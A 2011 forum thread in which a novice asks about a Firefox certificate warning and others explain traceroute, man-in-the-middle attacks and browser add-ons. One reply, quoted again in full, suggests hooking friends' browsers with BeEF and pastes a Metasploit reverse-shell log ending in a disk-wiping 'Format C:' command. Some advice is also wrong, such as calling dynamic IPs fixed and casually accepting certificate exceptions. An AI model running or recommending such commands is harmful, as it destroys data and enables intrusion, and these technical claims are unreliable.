---
title: "Weird website with a error by firefox"
date: 2011-03-19
forum: Security
---

### Post by TheNewbieGeek on 2011-03-19
I went to visit a website that I frequent and firefox through a error that basically said that the internet connection might be being tampered with and that the website was not authenticated. Meaning someone might be trying to load a fake website into my browser and impersonate the website to give me viruses or something. It's a website I frequent. Also the website doesn't have the www. in the url.

It's like this [http://hotornot.com/](http://hotornot.com/) 

It's usually like [http://www.hotornot.com](http://www.hotornot.com)

Do you know what to do? Thanks for the replies.

---

### Post by Dire_Devourer on 2011-03-20
I visited both of those hyperlinks and found no-error on either of the pages so I can't really diagnose what could be the problem as you have not really given a lot of information to go on. It could be your using an old revision of firefox that needs to be updated A.S.A.P as newer revisions contain the more essential security fixes. I have come across some site's like that in the past however, where the browser is asking you to set an exception as the signing security certificate is either out of date or provided by a totally different signing authority. If you think it's safe you can add an exception and then click the tiny button that says "Do not store this exception" which should allow you to browse the page.

If in doubt you could always add the Dillo PPA from the launchpad and use Dillo as it doesn't allow Javascripts and other unpleasant surprises into your browser.

One of the better security addons for firefox is NoScript available from the firefox addons website which prevents Java-script's from site's that you don't know all that well from executing Java unless you expressly permit it to.

Hope that helps, TTFN

---

### Post by TheNewbieGeek on 2011-03-20
Could you tell me what the website looked like to you? I think if were seeing the same thing then I don't need to worry. thanks

---

### Post by emiller12345 on 2011-03-21
You could also try a traceroute of your site...  
$ traceroute -n [www.hotornot.com]("http://www.hotornot.com") 
or  
$ host [www.hotornot.com]("http://www.hotornot.com") 
has address 66.240.151.103  
(according to OpenDNS) 
$ traceroute -n 66.240.151.103 

This will 'help you see' the path your outbound data is taking to get to its destination.

---

### Post by TheNewbieGeek on 2011-03-21
> **emiller12345 said:**
> You could also try a traceroute of your site...  
$ traceroute -n [www.hotornot.com]("http://www.hotornot.com") 
or  
$ host [www.hotornot.com]("http://www.hotornot.com") 
has address 66.240.151.103  
(according to OpenDNS) 
$ traceroute -n 66.240.151.103 

This will 'help you see' the path your outbound data is taking to get to its destination.

What is a "real" not "fake" path like? It is all just some numbers separated by dots to me lol...thanks

---

### Post by emiller12345 on 2011-03-21
This morning I detected some jerk attempting to hijack (MITM) my internet connection. When I tracerouted him I got:
$ traceroute -n 10.196.4.138 
traceroute to 10.196.4.138, 30 hops max, 40 byte packets
 1  192.168.0.254  0.367 ms  0.326 ms  0.514 ms
 2  10.196.4.138
this means he's probably close by as far as networking goes
if any traceroute you do looks like this(or they are all identical for any website you try) then you may have a problem
theres no right or wrong traceroute, but the more you learn how your network is set up, the easier it is to see a major change in the network
this is the tracert for google, which I think is okay
traceroute to [www.google.com]("http://www.google.com") (72.14.204.99), 30 hops max, 40 byte packets
 1  192.168.0.254  0.367 ms  0.326 ms  0.514 ms
 2  * * *
 3  10.24.22.41  30.054 ms  30.040 ms  30.234 ms
 4  10.12.11.32  31.836 ms  31.823 ms  31.953 ms
 5  198.32.118.39  66.839 ms  67.088 ms  67.068 ms
 6  209.85.248.178  45.752 ms  45.611 ms  45.337 ms
 7  209.85.249.11  50.791 ms  38.954 ms  36.724 ms
 8  66.249.94.46  38.659 ms 47.785 ms  47.759 ms
 9  72.14.204.99  36.903 ms  31.241 ms  39.442 ms

---

### Post by TheNewbieGeek on 2011-03-21
> **emiller12345 said:**
> This morning I detected some jerk attempting to hijack (MITM) my internet connection. When I tracerouted him I got:
$ traceroute -n 10.196.4.138 
traceroute to 10.196.4.138, 30 hops max, 40 byte packets
 1  192.168.0.254  0.367 ms  0.326 ms  0.514 ms
 2  10.196.4.138
this means he's probably close by as far as networking goes
if any traceroute you do looks like this(or they are all identical for any website you try) then you may have a problem
theres no right or wrong traceroute, but the more you learn how your network is set up, the easier it is to see a major change in the network
this is the tracert for google, which I think is okay
traceroute to [www.google.com]("http://www.google.com") (72.14.204.99), 30 hops max, 40 byte packets
 1  192.168.0.254  0.367 ms  0.326 ms  0.514 ms
 2  * * *
 3  10.24.22.41  30.054 ms  30.040 ms  30.234 ms
 4  10.12.11.32  31.836 ms  31.823 ms  31.953 ms
 5  198.32.118.39  66.839 ms  67.088 ms  67.068 ms
 6  209.85.248.178  45.752 ms  45.611 ms  45.337 ms
 7  209.85.249.11  50.791 ms  38.954 ms  36.724 ms
 8  66.249.94.46  38.659 ms 47.785 ms  47.759 ms
 9  72.14.204.99  36.903 ms  31.241 ms  39.442 ms

Here is the output of the traceroute...

traceroute to [www.hotornot.com]("http://www.hotornot.com") (66.240.151.103), 30 hops max, 60 byte packets
 1  192.168.1.1  0.832 ms  0.810 ms  0.795 ms
 2  71.189.226.1  29.004 ms  29.064 ms  29.051 ms
 3  130.81.129.221  11.838 ms  11.899 ms  11.888 ms
 4  130.81.29.126  13.990 ms  14.028 ms  14.048 ms
 5  152.63.112.5  14.309 ms  14.558 ms  16.998 ms
 6  154.54.13.85  17.108 ms  16.447 ms  16.444 ms
 7  154.54.29.201  16.726 ms 154.54.28.65  9.551 ms 154.54.44.129  9.397 ms
 8  154.54.0.238  49.410 ms 154.54.3.185  50.125 ms 154.54.30.189  13.501 ms
 9  154.54.0.206  59.776 ms 154.54.0.250  53.068 ms 154.54.0.242  52.936 ms
10  154.54.30.158  59.894 ms 154.54.25.93  50.331 ms 154.54.2.14  51.596 ms
11  154.54.27.182  99.715 ms 154.54.5.158  61.635 ms 154.54.5.126  59.954 ms
12  154.54.45.158  72.473 ms 154.54.7.166  71.086 ms 66.28.4.58  102.826 ms
13  154.54.40.178  99.722 ms 154.54.40.154  102.544 ms 154.54.42.10  99.843 ms
14  38.117.92.82  109.701 ms 154.54.40.178  99.938 ms  99.873 ms
15  38.117.92.82  106.320 ms 69.10.239.10  90.266 ms 38.117.92.82  100.017 ms
16  69.10.239.10  90.445 ms * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *

This would be too long to be fake right? Also...why does a fake website have a shorter route? thanks man. Oh...out of curiosity why does this website drop the www.  when you get to their website?

doesn't www. stand for world wide web?

---

### Post by cipherboy_loc on 2011-03-21
I don't know the answer to your first question (about the trace route), but if you set up Apache, you can specify in the config files to redirect to without the www. 


Cipherboy

---

### Post by emiller12345 on 2011-03-21
Script kiddies love MITM attacks cause it hardly takes any knowledge to implement.  DHCP is a widely used service that many internet service providers use to dish out ip, and is vulnerable to attack.  When an attack occurs, your data is channeled through the attacker's computer.  They usually also like to setup a proxy to do further damage, like removing all https(encryption) from the websites or injecting their own nasty code into your web browser. When all data is run through a nearby proxy, it sometimes looks like every website you visit is only one or two jumps away, no matter what the ip is, though if a hijacker plans well, I suppose they could get around that also.

---

### Post by TheNewbieGeek on 2011-03-22
> **emiller12345 said:**
> Script kiddies love MITM attacks cause it hardly takes any knowledge to implement.  DHCP is a widely used service that many internet service providers use to dish out ip, and is vulnerable to attack.  When an attack occurs, your data is channeled through the attacker's computer.  They usually also like to setup a proxy to do further damage, like removing all https(encryption) from the websites or injecting their own nasty code into your web browser. When all data is run through a nearby proxy, it sometimes looks like every website you visit is only one or two jumps away, no matter what the ip is, though if a hijacker plans well, I suppose they could get around that also.

Thanks man...does anybody know if a website without the www. in the url is fake?

---

### Post by TheNewbieGeek on 2011-03-22
> **cipherboy_loc said:**
> I don't know the answer to your first question (about the trace route), but if you set up Apache, you can specify in the config files to redirect to without the www. 


Cipherboy

Why would a website want to drop the [www.?](www.?)

---

### Post by Dire_Devourer on 2011-03-22
@TheNewbieGeek

Both websites you quoted looked fine, I got no warning page appear on either page.

I'm using Firefox version 3.6.15 with the FireCat & IceCat extensions with the headers forged so it calls itself Mozilla/5.0 (X11; U; Linux x86; (GNU; rv:1.9.1.7) Gecko/20100107 LolCat/3.6
:lolflag:
>  Why would a website drop the www? Many websites can exist without the www prefix, if you host a site locally from your own PC, you only have to use a service like no-ip.org to establish a DNS name for yourself and your IP, then you can call yourself what-ever you like... ie: lolcat.labs and the DNS hosting provider will point people searching for that domain in the direction of the IP address hosting the site. Site's without the WWW are effectively a sub-domain. That means those links are actually pointing to what are  effectively two different domains and that is how Google looks at it. So this way the page rank is split between different domains which is not an ideal scenario.

The whois details for [http://hotornot.com](http://hotornot.com) come up as the following:
 [REGISTRANT] 
    Organisation Name: Eight Days, Inc. 
    Contact Name:      Host Master 
    Address Line 1:    20 Eglinton Ave West 
    Address Line 2:    Suite 1200 
    City / Town:       Toronto 
    State / Province:  Ontario 
    Zip / Postcode:    M4R1K8 
    Country:           CA 
    Telephone:         +1.4164802334 

DNS provided by mydyndns which is a dynamic DNS hosting provider very similar to no-ip.org

Then the whois for the other domain wth the [www.hotornot.com]("http://www.hotornot.com") read as:

 [REGISTRANT] 
    Organisation Name: Eight Days, Inc. 
    Contact Name:      Host Master 
    Address Line 1:    20 Eglinton Ave West 
    Address Line 2:    Suite 1200 
    City / Town:       Toronto 
    State / Province:  Ontario 
    Zip / Postcode:    M4R1K8 
    Country:           CA 
    Telephone:         +1.4164802334 

DNS provided by mydyndns yet again

Thusly we can safely deduce it's the exact same site running a sub-domain on Apache/2.2.3 (Red Hat) via it's DNS provider so either hyperlink will work.

A static IP would be what you would be assigned if you where using a Dial-Up connection to the Internet but with broad-band speeds becoming more and more prevalent people are using Dynamic IP addresses more, which are fixed IP addresses that usually do not change unless your ISP cut's you off due to technical difficulties in which cases it may change to a different IP address. If you have a leased 20Mb Internet connection it would be very easy to setup your own website, run from your own PC thereby eliminating the need to pay a hosting provider a yearly subscription for there services. However again thats not ideal unless you can afford to lease two lines into your property as your speeds when browsing or gaming would vary considerably in light of the fact thousands of people might be trying to look at your web-site.

In one of your threads you mentioned Back|Track so I'll use it for this example, say you look up your IP as assigned to you by your hosting provider. You could then design your own web-site and run it with Apache (it's in the distro) you would then setup the site pages with a robots.txt and google-no-follow and google-no-cache to stop web-spiders and robots trawling your pages and making the whole world aware they exist as the traffic would be considerable 250'000 hits my mom got on her site in one day! (do I know SEO or do I know SEO!)

Then you could hand out your dynamic DNS name to people you wanted to come and visit the page from where you could then do all manner of evil things like attack there browser and turn them into your personal zombie with the BeEF framework. :twisted:

:lolflag:  :popcorn:

Of course it goes without saying that your domain would lead to your own IP, so you could only really do that to people you know well enough to know they would find it funny. People that say "oh so you like hacking stuff, well what can you hack!?" then you can follow that up with "Why not visit my site and I'll show you!" it really does get your point across when they visit the page and find their browser has suddenly decided to take on a life of its own with a little pop-up that reads, "I am going to MUNCH your Hard Disk.. Nom Nom Nom!"

Typically I wont just rely on fire-fox to keep my connection error or trouble free, I also use a Secure DNS provider, there are literally hundreds of free ones to choose from, I highly recommend one from an anti-virus provider or some such as they are normally at the forefront of combating malware and other such unpleasant surprises. The error and warnings in firefox are purely secondary and then if you thirdly take into account all the anti-scripting add-ons it's purely for more peace of mind. BeEF does nothing to a Browser running NoScript.. But what with most people running Internet Explorer (porn-exploder!) they are the ones that are usually in for a nasty surprise

---

### Post by TheNewbieGeek on 2011-03-23
> **Dire_Devourer said:**
> @TheNewbieGeek

Both websites you quoted looked fine, I got no warning page appear on either page.

I'm using Firefox version 3.6.15 with the FireCat & IceCat extensions with the headers forged so it calls itself Mozilla/5.0 (X11; U; Linux x86; (GNU; rv:1.9.1.7) Gecko/20100107 LolCat/3.6
:lolflag:
Many websites can exist without the www prefix, if you host a site locally from your own PC, you only have to use a service like no-ip.org to establish a DNS name for yourself and your IP, then you can call yourself what-ever you like... ie: lolcat.labs and the DNS hosting provider will point people searching for that domain in the direction of the IP address hosting the site. Site's without the WWW are effectively a sub-domain. That means those links are actually pointing to what are  effectively two different domains and that is how Google looks at it. So this way the page rank is split between different domains which is not an ideal scenario.

The whois details for [http://hotornot.com](http://hotornot.com) come up as the following:
 [REGISTRANT] 
    Organisation Name: Eight Days, Inc. 
    Contact Name:      Host Master 
    Address Line 1:    20 Eglinton Ave West 
    Address Line 2:    Suite 1200 
    City / Town:       Toronto 
    State / Province:  Ontario 
    Zip / Postcode:    M4R1K8 
    Country:           CA 
    Telephone:         +1.4164802334 

DNS provided by mydyndns which is a dynamic DNS hosting provider very similar to no-ip.org

Then the whois for the other domain wth the [www.hotornot.com]("http://www.hotornot.com") read as:

 [REGISTRANT] 
    Organisation Name: Eight Days, Inc. 
    Contact Name:      Host Master 
    Address Line 1:    20 Eglinton Ave West 
    Address Line 2:    Suite 1200 
    City / Town:       Toronto 
    State / Province:  Ontario 
    Zip / Postcode:    M4R1K8 
    Country:           CA 
    Telephone:         +1.4164802334 

DNS provided by mydyndns yet again

Thusly we can safely deduce it's the exact same site running a sub-domain on Apache/2.2.3 (Red Hat) via it's DNS provider so either hyperlink will work.

A static IP would be what you would be assigned if you where using a Dial-Up connection to the Internet but with broad-band speeds becoming more and more prevalent people are using Dynamic IP addresses more, which are fixed IP addresses that usually do not change unless your ISP cut's you off due to technical difficulties in which cases it may change to a different IP address. If you have a leased 20Mb Internet connection it would be very easy to setup your own website, run from your own PC thereby eliminating the need to pay a hosting provider a yearly subscription for there services. However again thats not ideal unless you can afford to lease two lines into your property as your speeds when browsing or gaming would vary considerably in light of the fact thousands of people might be trying to look at your web-site.

In one of your threads you mentioned Back|Track so I'll use it for this example, say you look up your IP as assigned to you by your hosting provider. You could then design your own web-site and run it with Apache (it's in the distro) you would then setup the site pages with a robots.txt and google-no-follow and google-no-cache to stop web-spiders and robots trawling your pages and making the whole world aware they exist as the traffic would be considerable 250'000 hits my mom got on her site in one day! (do I know SEO or do I know SEO!)

Then you could hand out your dynamic DNS name to people you wanted to come and visit the page from where you could then do all manner of evil things like attack there browser and turn them into your personal zombie with the BeEF framework. :twisted:

:lolflag:  :popcorn:

Of course it goes without saying that your domain would lead to your own IP, so you could only really do that to people you know well enough to know they would find it funny. People that say "oh so you like hacking stuff, well what can you hack!?" then you can follow that up with "Why not visit my site and I'll show you!" it really does get your point across when they visit the page and find their browser has suddenly decided to take on a life of its own with a little pop-up that reads, "I am going to MUNCH your Hard Disk.. Nom Nom Nom!"

Typically I wont just rely on fire-fox to keep my connection error or trouble free, I also use a Secure DNS provider, there are literally hundreds of free ones to choose from, I highly recommend one from an anti-virus provider or some such as they are normally at the forefront of combating malware and other such unpleasant surprises. The error and warnings in firefox are purely secondary and then if you thirdly take into account all the anti-scripting add-ons it's purely for more peace of mind. BeEF does nothing to a Browser running NoScript.. But what with most people running Internet Explorer (porn-exploder!) they are the ones that are usually in for a nasty surprise


Pretty technical talk :confused: Lol...but what I got out of it was that it is no big deal to have no www. because people often have website from 2 different domains and run them from home pc's these days as internet connections speeds have increased etc. Well it looks like they have recently redesigned their website and the look is different too so that's when I got the security alert from Firefox as of recently I haven't had the security message. You were right it needed to be authenticated and I had to make an exception for it. As of recently they got a security certificate and Firefox doesn't bring up the security alert anymore. So basically your saying it is safe to surf at this website? If I need to run a script on this website does noscript still protect me?... I have to click allow script to make the website work? Thanks dude.

---

### Post by Dire_Devourer on 2011-03-23
> Pretty technical talk :confused:  Lol...but what I got out of it was that it is no big deal to have no  www. because people often have website from 2 different domains and run  them from home pc's these days as internet connections speeds have  increased etc. Well it looks like they have recently redesigned their  website and the look is different too so that's when I got the security  alert from Firefox as of recently I haven't had the security message.  You were right it needed to be authenticated and I had to make an  exception for it. As of recently they got a security certificate and  Firefox doesn't bring up the security alert anymore. So basically your  saying it is safe to surf at this website? If I need to run a script on  this website does noscript still protect me?... I have to click allow  script to make the website work? Thanks dude.Technical nah, it's easy honest ;) The no-script would have to be set to either allow the website or temporarily allow (the one I go for most times) another great add-on is HTTPS Everywhere available from the EFF which ensures your connections are encrypted with SSL on every website that supports it. Once you allow the no-script element then yes technically your vulnerable to scripting, but if the site was dangerous you would get another different kind of warning about it being blocked for you safety due to the scripting elements. The warning about invalid certificates is a given, loads of sites have invalid (out of date) certificates because their admin is either too lazy to update it with a valid one or cant afford to pay for a new one. :)

Scripting attacks against firefox are rare, also your running Linux and this means you have the advantage of no WSH - Windows Scripting Host or ActiveX Desktop which protects you even more. Most attacks leverage against those with Java-script or Visual Basic Scripting. So take it from me, your pretty safe! ;)

Years ago an exploit came about called an HTA Uploader whereby if you visited a website running a vulnerable copy of Internet explorer and we're going way back here (Internet Explorer 4 & 5 and some versions of 5.5) without the patch (Microsoft did patch against it). Visiting a page with an HTA exploit ment a script would load into the browser, the person would not empty there browser cache, reboot and the Script would turn itself into an executable file and launch itself, in most instances the script uploaded a Back-door Executable. For an example of a hostile ActiveX script check out [ActiveX Exploder]("http://www.halcyon.com/mclain/ActiveX/") most of the newer versions of Internet Explorer cough up a warning about Unsafe ActiveX content but back in the day, it used to just load itself with no warning at all and I've run it myself over-riding the warning message a few times for the good old laugh of watching what it does. It switches your PC off!

If you have old copies of Windows 98SE, Windows XP and dare I say it even Windows 7 then its possible to do the following type of attacks purely for the educational value:

msf exploit([COLOR=#ff0000]handler[/COLOR]) > [COLOR=#339966]exploit[/COLOR]

[COLOR=#333399]
[*][/COLOR] Handler binding to LHOST 0.0.0.0
[COLOR=#333399]
[*][/COLOR] Started reverse handler
[COLOR=#333399]
[*][/COLOR] Starting the payload handler...
[COLOR=#333399]
[*][/COLOR] Sending stage (474 bytes)
[COLOR=#333399]
[*][/COLOR] Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\David\My Documents> Format C:\    /u /y

Game Over!

Here's the bit that will really bake your noodle, the anti-virus and firewall in Windows is purely cosmetic, it can not protect you or anyone else for that matter from someone who is dedicated enough to breach your defenses. Scary Stuff... Most corporate networks where windows has been deployed employ an  Intrusion Detection and Prevention Appliance (IDP & IDS) along with a Hard-Ware firewall, however such things are normally way out of the price range and the technical know how of the average home user.

Also a Hardware firewall does not mean, they still can not get in, if the firewall was wound up that tightly, then you yourself wouldn't be surfing the Internet as no data would be able to flow in or out. A cheap off the shelf VPN tunnel does not a secure network make.

An off the Shelf Netgear - FVS338 - ProSafe 8-Port VPN Firewall                                    $195.99 <-- Affordable

Or an off the Shelf WatchGuard WG505031 XTM 505 Firewall Appliance - 1Yr Security  $1,279.99 <-- Ouch!

I really, really want to lay my hands on one of these, introducing the watchguard 1050

[IMG]http://www.watchguard.com/images/ripley/product/xtm1050-mainprod.jpg[/IMG]
[http://www.watchguard.com/products/xtm-1050/detailed-specs.asp](http://www.watchguard.com/products/xtm-1050/detailed-specs.asp)

But I am way too scared to find out how much it would cost to actually buy one!

---

### Post by TheNewbieGeek on 2011-03-23
> **Dire_Devourer said:**
> Technical nah, it's easy honest ;) The no-script would have to be set to either allow the website or temporarily allow (the one I go for most times) another great add-on is HTTPS Everywhere available from the EFF which ensures your connections are encrypted with SSL on every website that supports it. Once you allow the no-script element then yes technically your vulnerable to scripting, but if the site was dangerous you would get another different kind of warning about it being blocked for you safety due to the scripting elements. The warning about invalid certificates is a given, loads of sites have invalid (out of date) certificates because their admin is either too lazy to update it with a valid one or cant afford to pay for a new one. :)

Scripting attacks against firefox are rare, also your running Linux and this means you have the advantage of no WSH - Windows Scripting Host or ActiveX Desktop which protects you even more. Most attacks leverage against those with Java-script or Visual Basic Scripting. So take it from me, your pretty safe! ;)

Years ago an exploit came about called an HTA Uploader whereby if you visited a website running a vulnerable copy of Internet explorer and we're going way back here (Internet Explorer 4 & 5 and some versions of 5.5) without the patch (Microsoft did patch against it). Visiting a page with an HTA exploit ment a script would load into the browser, the person would not empty there browser cache, reboot and the Script would turn itself into an executable file and launch itself, in most instances the script uploaded a Back-door Executable. For an example of a hostile ActiveX script check out [ActiveX Exploder]("http://www.halcyon.com/mclain/ActiveX/") most of the newer versions of Internet Explorer cough up a warning about Unsafe ActiveX content but back in the day, it used to just load itself with no warning at all and I've run it myself over-riding the warning message a few times for the good old laugh of watching what it does. It switches your PC off!

If you have old copies of Windows 98SE, Windows XP and dare I say it even Windows 7 then its possible to do the following type of attacks purely for the educational value:

msf exploit([COLOR=#ff0000]handler[/COLOR]) > [COLOR=#339966]exploit[/COLOR]

[COLOR=#333399]
[*][/COLOR] Handler binding to LHOST 0.0.0.0
[COLOR=#333399]
[*][/COLOR] Started reverse handler
[COLOR=#333399]
[*][/COLOR] Starting the payload handler...
[COLOR=#333399]
[*][/COLOR] Sending stage (474 bytes)
[COLOR=#333399]
[*][/COLOR] Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\David\My Documents> Format C:\    /u /y

Game Over!

Here's the bit that will really bake your noodle, the anti-virus and firewall in Windows is purely cosmetic, it can not protect you or anyone else for that matter from someone who is dedicated enough to breach your defenses. Scary Stuff... Most corporate networks where windows has been deployed employ an  Intrusion Detection and Prevention Appliance (IDP & IDS) along with a Hard-Ware firewall, however such things are normally way out of the price range and the technical know how of the average home user.

Also a Hardware firewall does not mean, they still can not get in, if the firewall was wound up that tightly, then you yourself wouldn't be surfing the Internet as no data would be able to flow in or out. A cheap off the shelf VPN tunnel does not a secure network make.

An off the Shelf Netgear - FVS338 - ProSafe 8-Port VPN Firewall                                    $195.99 <-- Affordable

Or an off the Shelf WatchGuard WG505031 XTM 505 Firewall Appliance - 1Yr Security  $1,279.99 <-- Ouch!

I really, really want to lay my hands on one of these, introducing the watchguard 1050

[IMG]http://www.watchguard.com/images/ripley/product/xtm1050-mainprod.jpg[/IMG]
[http://www.watchguard.com/products/xtm-1050/detailed-specs.asp](http://www.watchguard.com/products/xtm-1050/detailed-specs.asp)

But I am way too scared to find out how much it would cost to actually buy one!

WOW...alot of info thanks alot man.

---

